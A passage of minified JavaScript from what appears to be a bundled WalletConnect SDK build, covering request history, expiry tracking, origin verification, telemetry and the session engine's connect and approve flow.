this.restore(),this.cached.forEach(i=>this.records.set(i.id,i)),this.cached=[],this.registerEventListeners(),this.initialized=!0)}),to(this,"set",(i,n,s)=>{if(this.isInitialized(),this.logger.debug("Setting JSON-RPC request history record"),this.logger.trace({type:"method",method:"set",topic:i,request:n,chainId:s}),this.records.has(n.id))return;const o={id:n.id,topic:i,request:{method:n.method,params:n.params||null},chainId:s,expiry:bs(fe.THIRTY_DAYS)};this.records.set(o.id,o),this.persist(),this.events.emit(Kl.created,o)}),to(this,"resolve",async i=>{if(this.isInitialized(),this.logger.debug("Updating JSON-RPC response history record"),this.logger.trace({type:"method",method:"update",response:i}),!this.records.has(i.id))return;const n=await this.getRecord(i.id);typeof n.response>"u"&&(n.response=wi(i)?{error:i.error}:{result:i.result},this.records.set(n.id,n),this.persist(),this.events.emit(Kl.updated,n))}),to(this,"get",async(i,n)=>(this.isInitialized(),this.logger.debug("Getting record"),this.logger.trace({type:"method",method:"get",topic:i,id:n}),await this.getRecord(n))),to(this,"delete",(i,n)=>{this.isInitialized(),this.logger.debug("Deleting record"),this.logger.trace({type:"method",method:"delete",id:n}),this.values.forEach(s=>{if(s.topic===i){if(typeof n<"u"&&s.id!==n)return;this.records.delete(s.id),this.events.emit(Kl.deleted,s)}}),this.persist()}),to(this,"exists",async(i,n)=>(this.isInitialized(),this.records.has(n)?(await this.getRecord(n)).topic===i:!1)),to(this,"on",(i,n)=>{this.events.on(i,n)}),to(this,"once",(i,n)=>{this.events.once(i,n)}),to(this,"off",(i,n)=>{this.events.off(i,n)}),to(this,"removeListener",(i,n)=>{this.events.removeListener(i,n)}),this.logger=gr(t,this.name)}get context(){return Or(this.logger)}get storageKey(){return this.storagePrefix+this.version+this.core.customStoragePrefix+"//"+this.name}get size(){return this.records.size}get keys(){return Array.from(this.records.keys())}get values(){return Array.from(this.records.values())}get pending(){const e=[];return this.values.forEach(t=>{if(typeof t.response<"u")return;const i={topic:t.topic,request:jn(t.request.method,t.request.params,t.id),chainId:t.chainId};return e.push(i)}),e}async setJsonRpcRecords(e){await this.core.storage.setItem(this.storageKey,e)}async getJsonRpcRecords(){return await this.core.storage.getItem(this.storageKey)}getRecord(e){this.isInitialized();const t=this.records.get(e);if(!t){const{message:i}=at("NO_MATCHING_KEY",`${this.name}: ${e}`);throw new Error(i)}return t}async persist(){await this.setJsonRpcRecords(this.values),this.events.emit(Kl.sync)}async restore(){try{const e=await this.getJsonRpcRecords();if(typeof e>"u"||!e.length)return;if(this.records.size){const{message:t}=at("RESTORE_WILL_OVERRIDE",this.name);throw this.logger.error(t),new Error(t)}this.cached=e,this.logger.debug(`Successfully Restored records for ${this.name}`),this.logger.trace({type:"method",method:"restore",records:this.values})}catch(e){this.logger.debug(`Failed to Restore records for ${this.name}`),this.logger.error(e)}}registerEventListeners(){this.events.on(Kl.created,e=>{const t=Kl.created;this.logger.info(`Emitting ${t}`),this.logger.debug({type:"event",event:t,record:e})}),this.events.on(Kl.updated,e=>{const t=Kl.updated;this.logger.info(`Emitting ${t}`),this.logger.debug({type:"event",event:t,record:e})}),this.events.on(Kl.deleted,e=>{const t=Kl.deleted;this.logger.info(`Emitting ${t}`),this.logger.debug({type:"event",event:t,record:e})}),this.core.heartbeat.on(Ks.pulse,()=>{this.cleanup()})}cleanup(){try{this.isInitialized();let e=!1;this.records.forEach(t=>{fe.toMiliseconds(t.expiry||0)-Date.now()<=0&&(this.logger.info(`Deleting expired history log: ${t.id}`),this.records.delete(t.id),this.events.emit(Kl.deleted,t,!1),e=!0)}),e&&this.persist()}catch(e){this.logger.warn(e)}}isInitialized(){if(!this.initialized){const{message:e}=at("NOT_INITIALIZED",this.name);throw new Error(e)}}}var wlt=Object.defineProperty,blt=(r,e,t)=>e in r?wlt(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,ko=(r,e,t)=>blt(r,typeof e!="symbol"?e+"":e,t);class vlt extends Iet{constructor(e,t){super(e,t),this.core=e,this.logger=t,ko(this,"expirations",new Map),ko(this,"events",new en.EventEmitter),ko(this,"name",yot),ko(this,"version",xot),ko(this,"cached",[]),ko(this,"initialized",!1),ko(this,"storagePrefix",Kd),ko(this,"init",async()=>{this.initialized||(this.logger.trace("Initialized"),await this.restore(),this.cached.forEach(i=>this.expirations.set(i.target,i)),this.cached=[],this.registerEventListeners(),this.initialized=!0)}),ko(this,"has",i=>{try{const n=this.formatTarget(i);return typeof this.getExpiration(n)<"u"}catch{return!1}}),ko(this,"set",(i,n)=>{this.isInitialized();const s=this.formatTarget(i),o={target:s,expiry:n};this.expirations.set(s,o),this.checkExpiry(s,o),this.events.emit(Zc.created,{target:s,expiration:o})}),ko(this,"get",i=>{this.isInitialized();const n=this.formatTarget(i);return this.getExpiration(n)}),ko(this,"del",i=>{if(this.isInitialized(),this.has(i)){const n=this.formatTarget(i),s=this.getExpiration(n);this.expirations.delete(n),this.events.emit(Zc.deleted,{target:n,expiration:s})}}),ko(this,"on",(i,n)=>{this.events.on(i,n)}),ko(this,"once",(i,n)=>{this.events.once(i,n)}),ko(this,"off",(i,n)=>{this.events.off(i,n)}),ko(this,"removeListener",(i,n)=>{this.events.removeListener(i,n)}),this.logger=gr(t,this.name)}get context(){return Or(this.logger)}get storageKey(){return this.storagePrefix+this.version+this.core.customStoragePrefix+"//"+this.name}get length(){return this.expirations.size}get keys(){return Array.from(this.expirations.keys())}get values(){return Array.from(this.expirations.values())}formatTarget(e){if(typeof e=="string")return Irt(e);if(typeof e=="number")return Trt(e);const{message:t}=at("UNKNOWN_TYPE",`Target type: ${typeof e}`);throw new Error(t)}async setExpirations(e){await this.core.storage.setItem(this.storageKey,e)}async getExpirations(){return await this.core.storage.getItem(this.storageKey)}async persist(){await this.setExpirations(this.values),this.events.emit(Zc.sync)}async restore(){try{const e=await this.getExpirations();if(typeof e>"u"||!e.length)return;if(this.expirations.size){const{message:t}=at("RESTORE_WILL_OVERRIDE",this.name);throw this.logger.error(t),new Error(t)}this.cached=e,this.logger.debug(`Successfully Restored expirations for ${this.name}`),this.logger.trace({type:"method",method:"restore",expirations:this.values})}catch(e){this.logger.debug(`Failed to Restore expirations for ${this.name}`),this.logger.error(e)}}getExpiration(e){const t=this.expirations.get(e);if(!t){const{message:i}=at("NO_MATCHING_KEY",`${this.name}: ${e}`);throw this.logger.warn(i),new Error(i)}return t}checkExpiry(e,t){const{expiry:i}=t;fe.toMiliseconds(i)-Date.now()<=0&&this.expire(e,t)}expire(e,t){this.expirations.delete(e),this.events.emit(Zc.expired,{target:e,expiration:t})}checkExpirations(){this.core.relayer.connected&&this.expirations.forEach((e,t)=>this.checkExpiry(t,e))}registerEventListeners(){this.core.heartbeat.on(Ks.pulse,()=>this.checkExpirations()),this.events.on(Zc.created,e=>{const t=Zc.created;this.logger.info(`Emitting ${t}`),this.logger.debug({type:"event",event:t,data:e}),this.persist()}),this.events.on(Zc.expired,e=>{const t=Zc.expired;this.logger.info(`Emitting ${t}`),this.logger.debug({type:"event",event:t,data:e}),this.persist()}),this.events.on(Zc.deleted,e=>{const t=Zc.deleted;this.logger.info(`Emitting ${t}`),this.logger.debug({type:"event",event:t,data:e}),this.persist()})}isInitialized(){if(!this.initialized){const{message:e}=at("NOT_INITIALIZED",this.name);throw new Error(e)}}}var ylt=Object.defineProperty,xlt=(r,e,t)=>e in r?ylt(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,ns=(r,e,t)=>xlt(r,typeof e!="symbol"?e+"":e,t);class Clt extends Tet{constructor(e,t,i){super(e,t,i),this.core=e,this.logger=t,this.store=i,ns(this,"name",Cot),ns(this,"abortController"),ns(this,"isDevEnv"),ns(this,"verifyUrlV3",_ot),ns(this,"storagePrefix",Kd),ns(this,"version",_oe),ns(this,"publicKey"),ns(this,"fetchPromise"),ns(this,"init",async()=>{var n;this.isDevEnv||(this.publicKey=await this.store.getItem(this.storeKey),this.publicKey&&fe.toMiliseconds((n=this.publicKey)==null?void 0:n.expiresAt)<Date.now()&&(this.logger.debug("verify v2 public key expired"),await this.removePublicKey()))}),ns(this,"register",async n=>{if(!K3()||this.isDevEnv)return;const s=window.location.origin,{id:o,decryptedId:a}=n,c=`${this.verifyUrlV3}/attestation?projectId=${this.core.projectId}&origin=${s}&id=${o}&decryptedId=${a}`;try{const l=vn.getDocument(),u=this.startAbortTimer(fe.ONE_SECOND*5),d=await new Promise((h,f)=>{const p=()=>{window.removeEventListener("message",w),l.body.removeChild(g),f("attestation aborted")};this.abortController.signal.addEventListener("abort",p);const g=l.createElement("iframe");g.src=c,g.style.display="none",g.addEventListener("error",p,{signal:this.abortController.signal});const w=m=>{if(m.data&&typeof m.data=="string")try{const x=JSON.parse(m.data);if(x.type==="verify_attestation"){if(u0(x.attestation).payload.id!==o)return;clearInterval(u),l.body.removeChild(g),this.abortController.signal.removeEventListener("abort",p),window.removeEventListener("message",w),h(x.attestation===null?"":x.attestation)}}catch(x){this.logger.warn(x)}};l.body.appendChild(g),window.addEventListener("message",w,{signal:this.abortController.signal})});return this.logger.debug("jwt attestation",d),d}catch(l){this.logger.warn(l)}return""}),ns(this,"resolve",async n=>{if(this.isDevEnv)return"";const{attestationId:s,hash:o,encryptedId:a}=n;if(s===""){this.logger.debug("resolve: attestationId is empty, skipping");return}if(s){if(u0(s).payload.id!==a)return;const l=await this.isValidJwtAttestation(s);if(l){if(!l.isVerified){this.logger.warn("resolve: jwt attestation: origin url not verified");return}return l}}if(!o)return;const c=this.getVerifyUrl(n?.verifyUrl);return this.fetchAttestation(o,c)}),ns(this,"fetchAttestation",async(n,s)=>{this.logger.debug(`resolving attestation: ${n} from url: ${s}`);const o=this.startAbortTimer(fe.ONE_SECOND*5),a=await fetch(`${s}/attestation/${n}?v2Supported=true`,{signal:this.abortController.signal});return clearTimeout(o),a.status===200?await a.json():void 0}),ns(this,"getVerifyUrl",n=>{let s=n||J5;return Sot.includes(s)||(this.logger.info(`verify url: ${s}, not included in trusted list, assigning default: ${J5}`),s=J5),s}),ns(this,"fetchPublicKey",async()=>{try{this.logger.debug(`fetching public key from: ${this.verifyUrlV3}`);const n=this.startAbortTimer(fe.FIVE_SECONDS),s=await fetch(`${this.verifyUrlV3}/public-key`,{signal:this.abortController.signal});return clearTimeout(n),await s.json()}catch(n){this.logger.warn(n)}}),ns(this,"persistPublicKey",async n=>{this.logger.debug("persisting public key to local storage",n),await this.store.setItem(this.storeKey,n),this.publicKey=n}),ns(this,"removePublicKey",async()=>{this.logger.debug("removing verify v2 public key from storage"),await this.store.removeItem(this.storeKey),this.publicKey=void 0}),ns(this,"isValidJwtAttestation",async n=>{const s=await this.getPublicKey();try{if(s)return this.validateAttestation(n,s)}catch(a){this.logger.error(a),this.logger.warn("error validating attestation")}const o=await this.fetchAndPersistPublicKey();try{if(o)return this.validateAttestation(n,o)}catch(a){this.logger.error(a),this.logger.warn("error validating attestation")}}),ns(this,"getPublicKey",async()=>this.publicKey?this.publicKey:await this.fetchAndPersistPublicKey()),ns(this,"fetchAndPersistPublicKey",async()=>{if(this.fetchPromise)return await this.fetchPromise,this.publicKey;this.fetchPromise=new Promise(async s=>{const o=await this.fetchPublicKey();o&&(await this.persistPublicKey(o),s(o))});const n=await this.fetchPromise;return this.fetchPromise=void 0,n}),ns(this,"validateAttestation",(n,s)=>{const o=ist(n,s.publicKey),a={hasExpired:fe.toMiliseconds(o.exp)<Date.now(),payload:o};if(a.hasExpired)throw this.logger.warn("resolve: jwt attestation expired"),new Error("JWT attestation expired");return{origin:a.payload.origin,isScam:a.payload.isScam,isVerified:a.payload.isVerified}}),this.logger=gr(t,this.name),this.abortController=new AbortController,this.isDevEnv=dB(),this.init()}get storeKey(){return this.storagePrefix+this.version+this.core.customStoragePrefix+"//verify:public:key"}get context(){return Or(this.logger)}startAbortTimer(e){return this.abortController=new AbortController,setTimeout(()=>this.abortController.abort(),fe.toMiliseconds(e))}}var Elt=Object.defineProperty,_lt=(r,e,t)=>e in r?Elt(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,yG=(r,e,t)=>_lt(r,typeof e!="symbol"?e+"":e,t);class Slt extends ket{constructor(e,t){super(e,t),this.projectId=e,this.logger=t,yG(this,"context",Aot),yG(this,"registerDeviceToken",async i=>{const{clientId:n,token:s,notificationType:o,enableEncrypted:a=!1}=i,c=`${Iot}/${this.projectId}/clients`;await fetch(c,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({client_id:n,type:o,token:s,always_raw:a})})}),this.logger=gr(t,this.context)}}var Alt=Object.defineProperty,xG=Object.getOwnPropertySymbols,Ilt=Object.prototype.hasOwnProperty,Tlt=Object.prototype.propertyIsEnumerable,HP=(r,e,t)=>e in r?Alt(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,Zb=(r,e)=>{for(var t in e||(e={}))Ilt.call(e,t)&&HP(r,t,e[t]);if(xG)for(var t of xG(e))Tlt.call(e,t)&&HP(r,t,e[t]);return r},Rs=(r,e,t)=>HP(r,typeof e!="symbol"?e+"":e,t);class klt extends Net{constructor(e,t,i=!0){super(e,t,i),this.core=e,this.logger=t,Rs(this,"context",kot),Rs(this,"storagePrefix",Kd),Rs(this,"storageVersion",Tot),Rs(this,"events",new Map),Rs(this,"shouldPersist",!1),Rs(this,"init",async()=>{if(!dB())try{const n={eventId:fK(),timestamp:Date.now(),domain:this.getAppDomain(),props:{event:"INIT",type:"",properties:{client_id:await this.core.crypto.getClientId(),user_agent:Use(this.core.relayer.protocol,this.core.relayer.version,DP)}}};await this.sendEvent([n])}catch(n){this.logger.warn(n)}}),Rs(this,"createEvent",n=>{const{event:s="ERROR",type:o="",properties:{topic:a,trace:c}}=n,l=fK(),u=this.core.projectId||"",d=Date.now(),h=Zb({eventId:l,timestamp:d,props:{event:s,type:o,properties:{topic:a,trace:c}},bundleId:u,domain:this.getAppDomain()},this.setMethods(l));return this.telemetryEnabled&&(this.events.set(l,h),this.shouldPersist=!0),h}),Rs(this,"getEvent",n=>{const{eventId:s,topic:o}=n;if(s)return this.events.get(s);const a=Array.from(this.events.values()).find(c=>c.props.properties.topic===o);if(a)return Zb(Zb({},a),this.setMethods(a.eventId))}),Rs(this,"deleteEvent",n=>{const{eventId:s}=n;this.events.delete(s),this.shouldPersist=!0}),Rs(this,"setEventListeners",()=>{this.core.heartbeat.on(Ks.pulse,async()=>{this.shouldPersist&&await this.persist(),this.events.forEach(n=>{fe.fromMiliseconds(Date.now())-fe.fromMiliseconds(n.timestamp)>Not&&(this.events.delete(n.eventId),this.shouldPersist=!0)})})}),Rs(this,"setMethods",n=>({addTrace:s=>this.addTrace(n,s),setError:s=>this.setError(n,s)})),Rs(this,"addTrace",(n,s)=>{const o=this.events.get(n);o&&(o.props.properties.trace.push(s),this.events.set(n,o),this.shouldPersist=!0)}),Rs(this,"setError",(n,s)=>{const o=this.events.get(n);o&&(o.props.type=s,o.timestamp=Date.now(),this.events.set(n,o),this.shouldPersist=!0)}),Rs(this,"persist",async()=>{await this.core.storage.setItem(this.storageKey,Array.from(this.events.values())),this.shouldPersist=!1}),Rs(this,"restore",async()=>{try{const n=await this.core.storage.getItem(this.storageKey)||[];if(!n.length)return;n.forEach(s=>{this.events.set(s.eventId,Zb(Zb({},s),this.setMethods(s.eventId)))})}catch(n){this.logger.warn(n)}}),Rs(this,"submit",async()=>{if(!this.telemetryEnabled||this.events.size===0)return;const n=[];for(const[s,o]of this.events)o.props.type&&n.push(o);if(n.length!==0)try{if((await this.sendEvent(n)).ok)for(const s of n)this.events.delete(s.eventId),this.shouldPersist=!0}catch(s){this.logger.warn(s)}}),Rs(this,"sendEvent",async n=>{const s=this.getAppDomain()?"":"&sp=desktop";return await fetch(`${Pot}?projectId=${this.core.projectId}&st=events_sdk&sv=js-${DP}${s}`,{method:"POST",body:JSON.stringify(n)})}),Rs(this,"getAppDomain",()=>Lse().url),this.logger=gr(t,this.context),this.telemetryEnabled=i,i?this.restore().then(async()=>{await this.submit(),this.setEventListeners()}):this.persist()}get storageKey(){return this.storagePrefix+this.storageVersion+this.core.customStoragePrefix+"//"+this.context}}var Nlt=Object.defineProperty,CG=Object.getOwnPropertySymbols,Plt=Object.prototype.hasOwnProperty,$lt=Object.prototype.propertyIsEnumerable,VP=(r,e,t)=>e in r?Nlt(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,EG=(r,e)=>{for(var t in e||(e={}))Plt.call(e,t)&&VP(r,t,e[t]);if(CG)for(var t of CG(e))$lt.call(e,t)&&VP(r,t,e[t]);return r},on=(r,e,t)=>VP(r,typeof e!="symbol"?e+"":e,t);let Rlt=class Loe extends met{constructor(e){var t;super(e),on(this,"protocol",Eoe),on(this,"version",_oe),on(this,"name",MP),on(this,"relayUrl"),on(this,"projectId"),on(this,"customStoragePrefix"),on(this,"events",new en.EventEmitter),on(this,"logger"),on(this,"heartbeat"),on(this,"relayer"),on(this,"crypto"),on(this,"storage"),on(this,"history"),on(this,"expirer"),on(this,"pairing"),on(this,"verify"),on(this,"echoClient"),on(this,"linkModeSupportedApps"),on(this,"eventClient"),on(this,"initialized",!1),on(this,"logChunkController"),on(this,"on",(a,c)=>this.events.on(a,c)),on(this,"once",(a,c)=>this.events.once(a,c)),on(this,"off",(a,c)=>this.events.off(a,c)),on(this,"removeListener",(a,c)=>this.events.removeListener(a,c)),on(this,"dispatchEnvelope",({topic:a,message:c,sessionExists:l})=>{if(!a||!c)return;const u={topic:a,message:c,publishedAt:Date.now(),transportType:pn.link_mode};this.relayer.onLinkMessageEvent(u,{sessionExists:l})});const i=this.getGlobalCore(e?.customStoragePrefix);if(i)try{return this.customStoragePrefix=i.customStoragePrefix,this.logger=i.logger,this.heartbeat=i.heartbeat,this.crypto=i.crypto,this.history=i.history,this.expirer=i.expirer,this.storage=i.storage,this.relayer=i.relayer,this.pairing=i.pairing,this.verify=i.verify,this.echoClient=i.echoClient,this.linkModeSupportedApps=i.linkModeSupportedApps,this.eventClient=i.eventClient,this.initialized=i.initialized,this.logChunkController=i.logChunkController,i}catch(a){console.warn("Failed to copy global core",a)}this.projectId=e?.projectId,this.relayUrl=e?.relayUrl||Aoe,this.customStoragePrefix=e!=null&&e.customStoragePrefix?`:${e.customStoragePrefix}`:"";const n=ra({level:typeof e?.logger=="string"&&e.logger?e.logger:Xst.logger,name:MP}),{logger:s,chunkLoggerController:o}=_3({opts:n,maxSizeInBytes:e?.maxLogBlobSizeInBytes,loggerOverride:e?.logger});this.logChunkController=o,(t=this.logChunkController)!=null&&t.downloadLogsBlobInBrowser&&(window.downloadLogsBlobInBrowser=async()=>{var a,c;(a=this.logChunkController)!=null&&a.downloadLogsBlobInBrowser&&((c=this.logChunkController)==null||c.downloadLogsBlobInBrowser({clientId:await this.crypto.getClientId()}))}),this.logger=gr(s,this.name),this.heartbeat=new Z$,this.crypto=new oct(this,this.logger,e?.keychain),this.history=new mlt(this,this.logger),this.expirer=new vlt(this,this.logger),this.storage=e!=null&&e.storage?e.storage:new Y$(EG(EG({},eot),e?.storageOptions)),this.relayer=new Rct({core:this,logger:this.logger,relayUrl:this.relayUrl,projectId:this.projectId}),this.pairing=new flt(this,this.logger),this.verify=new Clt(this,this.logger,this.storage),this.echoClient=new Slt(this.projectId||"",this.logger),this.linkModeSupportedApps=[],this.eventClient=new klt(this,this.logger,e?.telemetryEnabled),this.setGlobalCore(this)}static async init(e){const t=new Loe(e);await t.initialize();const i=await t.crypto.getClientId();return await t.storage.setItem(fot,i),t}get context(){return Or(this.logger)}async start(){this.initialized||await this.initialize()}async getLogsBlob(){var e;return(e=this.logChunkController)==null?void 0:e.logsToBlob({clientId:await this.crypto.getClientId()})}async addLinkModeSupportedApp(e){this.linkModeSupportedApps.includes(e)||(this.linkModeSupportedApps.push(e),await this.storage.setItem(rG,this.linkModeSupportedApps))}async initialize(){this.logger.trace("Initialized");try{await this.crypto.init(),await this.history.init(),await this.expirer.init(),await this.relayer.init(),await this.heartbeat.init(),await this.pairing.init(),this.linkModeSupportedApps=await this.storage.getItem(rG)||[],this.initialized=!0,this.logger.info("Core Initialization Success")}catch(e){throw this.logger.warn(`Core Initialization Failure at epoch ${Date.now()}`,e),this.logger.error(e.message),e}}getGlobalCore(e=""){try{if(this.isGlobalCoreDisabled())return;const t=`_walletConnectCore_${e}`,i=`${t}_count`;return globalThis[i]=(globalThis[i]||0)+1,globalThis[i]>1&&console.warn(`WalletConnect Core is already initialized. This is probably a mistake and can lead to unexpected behavior. Init() was called ${globalThis[i]} times.`),globalThis[t]}catch(t){console.warn("Failed to get global WalletConnect core",t);return}}setGlobalCore(e){var t;try{if(this.isGlobalCoreDisabled())return;const i=`_walletConnectCore_${((t=e.opts)==null?void 0:t.customStoragePrefix)||""}`;globalThis[i]=e}catch(i){console.warn("Failed to set global WalletConnect core",i)}}isGlobalCoreDisabled(){try{return typeof process<"u"&&Qst.DISABLE_GLOBAL_CORE==="true"}catch{return!0}}};const Olt=Rlt,Uoe="wc",joe=2,Foe="client",vB=`${Uoe}@${joe}:${Foe}:`,NT={name:Foe,logger:"error"},_G="WALLETCONNECT_DEEPLINK_CHOICE",Blt="proposal",SG="Proposal expired",Mlt="session",fm=fe.SEVEN_DAYS,Dlt="engine",Os={wc_sessionPropose:{req:{ttl:fe.FIVE_MINUTES,prompt:!0,tag:1100},res:{ttl:fe.FIVE_MINUTES,prompt:!1,tag:1101},reject:{ttl:fe.FIVE_MINUTES,prompt:!1,tag:1120},autoReject:{ttl:fe.FIVE_MINUTES,prompt:!1,tag:1121}},wc_sessionSettle:{req:{ttl:fe.FIVE_MINUTES,prompt:!1,tag:1102},res:{ttl:fe.FIVE_MINUTES,prompt:!1,tag:1103}},wc_sessionUpdate:{req:{ttl:fe.ONE_DAY,prompt:!1,tag:1104},res:{ttl:fe.ONE_DAY,prompt:!1,tag:1105}},wc_sessionExtend:{req:{ttl:fe.ONE_DAY,prompt:!1,tag:1106},res:{ttl:fe.ONE_DAY,prompt:!1,tag:1107}},wc_sessionRequest:{req:{ttl:fe.FIVE_MINUTES,prompt:!0,tag:1108},res:{ttl:fe.FIVE_MINUTES,prompt:!1,tag:1109}},wc_sessionEvent:{req:{ttl:fe.FIVE_MINUTES,prompt:!0,tag:1110},res:{ttl:fe.FIVE_MINUTES,prompt:!1,tag:1111}},wc_sessionDelete:{req:{ttl:fe.ONE_DAY,prompt:!1,tag:1112},res:{ttl:fe.ONE_DAY,prompt:!1,tag:1113}},wc_sessionPing:{req:{ttl:fe.ONE_DAY,prompt:!1,tag:1114},res:{ttl:fe.ONE_DAY,prompt:!1,tag:1115}},wc_sessionAuthenticate:{req:{ttl:fe.ONE_HOUR,prompt:!0,tag:1116},res:{ttl:fe.ONE_HOUR,prompt:!1,tag:1117},reject:{ttl:fe.FIVE_MINUTES,prompt:!1,tag:1118},autoReject:{ttl:fe.FIVE_MINUTES,prompt:!1,tag:1119}}},PT={min:fe.FIVE_MINUTES,max:fe.SEVEN_DAYS},Qu={idle:"IDLE",active:"ACTIVE"},AG={eth_sendTransaction:{key:""},eth_sendRawTransaction:{key:""},wallet_sendCalls:{key:""},solana_signTransaction:{key:"signature"},solana_signAllTransactions:{key:"transactions"},solana_signAndSendTransaction:{key:"signature"}},Llt="request",Ult=["wc_sessionPropose","wc_sessionRequest","wc_authRequest","wc_sessionAuthenticate"],jlt="wc",Flt="auth",qlt="authKeys",zlt="pairingTopics",Wlt="requests",_E=`${jlt}@${1.5}:${Flt}:`,N9=`${_E}:PUB_KEY`;var Hlt=Object.defineProperty,Vlt=Object.defineProperties,Klt=Object.getOwnPropertyDescriptors,IG=Object.getOwnPropertySymbols,Glt=Object.prototype.hasOwnProperty,Zlt=Object.prototype.propertyIsEnumerable,KP=(r,e,t)=>e in r?Hlt(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,Qi=(r,e)=>{for(var t in e||(e={}))Glt.call(e,t)&&KP(r,t,e[t]);if(IG)for(var t of IG(e))Zlt.call(e,t)&&KP(r,t,e[t]);return r},zo=(r,e)=>Vlt(r,Klt(e)),qe=(r,e,t)=>KP(r,typeof e!="symbol"?e+"":e,t);class Ylt extends Oet{constructor(e){super(e),qe(this,"name",Dlt),qe(this,"events",new T0),qe(this,"initialized",!1),qe(this,"requestQueue",{state:Qu.idle,queue:[]}),qe(this,"sessionRequestQueue",{state:Qu.idle,queue:[]}),qe(this,"requestQueueDelay",fe.ONE_SECOND),qe(this,"expectedPairingMethodMap",new Map),qe(this,"recentlyDeletedMap",new Map),qe(this,"recentlyDeletedLimit",200),qe(this,"relayMessageCache",[]),qe(this,"pendingSessions",new Map),qe(this,"init",async()=>{this.initialized||(await this.cleanup(),this.registerRelayerEvents(),this.registerExpirerEvents(),this.registerPairingEvents(),await this.registerLinkModeListeners(),this.client.core.pairing.register({methods:Object.keys(Os)}),this.initialized=!0,setTimeout(async()=>{await this.processPendingMessageEvents(),this.sessionRequestQueue.queue=this.getPendingSessionRequests(),this.processSessionRequestQueue()},fe.toMiliseconds(this.requestQueueDelay)))}),qe(this,"connect",async t=>{this.isInitialized(),await this.confirmOnlineStateOrThrow();const i=zo(Qi({},t),{requiredNamespaces:t.requiredNamespaces||{},optionalNamespaces:t.optionalNamespaces||{}});await this.isValidConnect(i),i.optionalNamespaces=vst(i.requiredNamespaces,i.optionalNamespaces),i.requiredNamespaces={};const{pairingTopic:n,requiredNamespaces:s,optionalNamespaces:o,sessionProperties:a,scopedProperties:c,relays:l}=i;let u=n,d,h=!1;try{if(u){const I=this.client.core.pairing.pairings.get(u);this.client.logger.warn("connect() with existing pairing topic is deprecated and will be removed in the next major release."),h=I.active}}catch(I){throw this.client.logger.error(`connect() -> pairing.get(${u}) failed`),I}if(!u||!h){const{topic:I,uri:E}=await this.client.core.pairing.create();u=I,d=E}if(!u){const{message:I}=at("NO_MATCHING_KEY",`connect() pairing topic: ${u}`);throw new Error(I)}const f=await this.client.core.crypto.generateKeyPair(),p=Os.wc_sessionPropose.req.ttl||fe.FIVE_MINUTES,g=bs(p),w=zo(Qi(Qi({requiredNamespaces:s,optionalNamespaces:o,relays:l??[{protocol:Soe}],proposer:{publicKey:f,metadata:this.client.metadata},expiryTimestamp:g,pairingTopic:u},a&&{sessionProperties:a}),c&&{scopedProperties:c}),{id:mn()}),m=Pi("session_connect",w.id),{reject:x,resolve:S,done:T}=n1(p,SG),k=({id:I})=>{I===w.id&&(this.client.events.off("proposal_expire",k),this.pendingSessions.delete(w.id),this.events.emit(m,{error:{message:SG,code:0}}))};return this.client.events.on("proposal_expire",k),this.events.once(m,({error:I,session:E})=>{this.client.events.off("proposal_expire",k),I?x(I):E&&S(E)}),await this.sendRequest({topic:u,method:"wc_sessionPropose",params:w,throwOnFailedPublish:!0,clientRpcId:w.id}),await this.setProposal(w.id,w),{uri:d,approval:T}}),qe(this,"pair",async t=>{this.isInitialized(),await this.confirmOnlineStateOrThrow();try{return await this.client.core.pairing.pair(t)}catch(i){throw this.client.logger.error("pair() failed"),i}}),qe(this,"approve",async t=>{var i,n,s;const o=this.client.core.eventClient.createEvent({properties:{topic:(i=t?.id)==null?void 0:i.toString(),trace:[Gl.session_approve_started]}});try{this.isInitialized(),await this.confirmOnlineStateOrThrow()}catch(N){throw o.setError(Yp.no_internet_connection),N}try{await this.isValidProposalId(t?.id)}catch(N){throw this.client.logger.error(`approve() -> proposal.get(${t?.id}) failed`),o.setError(Yp.proposal_not_found),N}try{await this.isValidApprove(t)}catch(N){throw this.client.logger.error("approve() -> isValidApprove() failed"),o.setError(Yp.session_approve_namespace_validation_failure),N}const{id:a,relayProtocol:c,namespaces:l,sessionProperties:u,scopedProperties:d,sessionConfig:h}=t,f=this.client.proposal.get(a);this.client.core.eventClient.deleteEvent({eventId:o.eventId});const{pairingTopic:p,proposer:g,requiredNamespaces:w,optionalNamespaces:m}=f;let x=(n=this.client.core.eventClient)==null?void 0:n.getEvent({topic:p});x||(x=(s=this.client.core.eventClient)==null?void 0:s.createEvent({type:Gl.session_approve_started,properties:{topic:p,trace:[Gl.session_approve_started,Gl.session_namespaces_validation_success]}}));const S=await this.client.core.crypto.generateKeyPair(),T=g.publicKey,k=await this.client.core.crypto.generateSharedKey(S,T),I=Qi(Qi(Qi({relay:{protocol:c??"irn"},namespaces:l,controller:{publicKey:S,metadata:this.client.metadata},expiry:bs(fm)},u&&{sessionProperties:u}),d&&{scopedProperties:d}),h&&{sessionConfig:h}),E=pn.relay;x.addTrace(Gl.subscribing_session_topic);try{await this.client.core.relayer.subscribe(k,{transportType:E})}catch(N){throw x.setError(Yp.subscribe_session_topic_failure),N}x.addTrace(Gl.subscribe_session_topic_success);const C=zo(Qi({},I),{topic:k,requiredNamespaces:w,optionalNamespaces:m,pairingTopic:p,acknowledged:!1,self:I.controller,peer:{publicKey:g.publicKey,metadata:g.metadata},controller:S,transportType:pn.relay});await this.client.session.set(k,C),x.addTrace(Gl.store_session);try{x.addTrace(Gl.publishing_session_settle),await this.sendRequest({topic:k,method:"wc_sessionSettle",params:I,throwOnFailedPublish:!0}).catch(N=>{throw x?.setError(Yp.session_settle_publish_failure),N}),x.addTrace(Gl.session_settle_publish_success),x.addTrace(Gl.publishing_session_approve),await this.sendResult({id:a,topic:p,result:{relay:{protocol:c??"irn"},responderPublicKey:S},throwOnFailedPublish:!0}).catch(N=>{throw x?.setError(Yp.session_approve_publish_failure),N}),x.addTrace(Gl.session_approve_publish_success)}catch(N){throw this.client.logger.error(N),this.client.session.delete(k,Vi("USER_DISCONNECTED")),await this.client.core.relayer.unsubscribe(k),N}return this.client.core.eventClient.deleteEvent({eventId:x.eventId}),await this.client.core.pairing.updateMetadata({topic:p,metadata:g.metadata}),await 